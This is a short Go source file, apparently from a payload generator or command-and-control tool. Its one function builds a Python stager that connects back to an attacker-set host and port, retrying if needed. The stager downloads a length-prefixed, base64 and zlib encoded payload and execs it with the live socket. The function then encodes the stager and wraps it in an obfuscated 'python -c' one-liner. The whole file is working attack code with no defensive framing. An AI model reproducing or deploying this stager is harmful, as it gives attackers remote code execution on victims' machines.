package main

import (
	"encoding/base64"
	"fmt"
)

func NewPayload() string {

	template := fmt.Sprintf(`
import socket,zlib,base64,struct,time
for x in range(10):
	try:
		s=socket.socket(2,socket.SOCK_STREAM)
		s.connect(('%s',%s))
		break
	except:
		time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
	d+=s.recv(l-len(d))
exec(zlib.decompress(base64.b64decode(d)),{'s':s})`, LHOST, LPORT)

	p := base64.StdEncoding.EncodeToString([]byte(template))

	return fmt.Sprintf(`python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('%s')[0]))"`, p)
}
